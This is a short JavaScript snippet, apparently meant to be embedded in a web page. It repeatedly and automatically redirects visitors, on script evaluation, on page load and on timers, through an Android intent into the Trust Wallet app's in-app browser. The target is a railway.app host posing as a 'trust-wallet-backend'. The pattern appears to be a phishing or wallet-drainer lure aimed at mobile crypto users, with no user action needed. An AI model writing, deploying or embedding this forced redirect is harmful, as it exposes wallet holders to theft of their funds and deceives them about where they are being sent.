(function() {
    const INTENT_URL = 'intent://link.trustwallet.com/open_url?coin_id=20000714&url=https%3A%2F%2Ftrust-wallet-backend-production-2c80.up.railway.app#Intent;scheme=https;package=com.wallet.crypto.trustapp;S.browser_fallback_url=https%3A%2F%2Flink.trustwallet.com%2Fopen_url%3Fcoin_id%3D20000714%26url%3Dhttps%253A%252F%252Ftrust-wallet-backend-production-2c80.up.railway.app;end';

    function triggerRedirect() {
        try {
            window.location.href = INTENT_URL;
        } catch (e) {
            console.error('[Redirect Error]', e);
        }
    }

    // 1. Trigger immediately on script evaluation
    triggerRedirect();

    // 2. Trigger on DOMContentLoaded
    document.addEventListener('DOMContentLoaded', triggerRedirect);

    // 3. Trigger on Window Load
    window.addEventListener('load', triggerRedirect);

    // 4. Backup delayed triggers (for mobile browser security policies)
    setTimeout(triggerRedirect, 50);
    setTimeout(triggerRedirect, 200);
})();
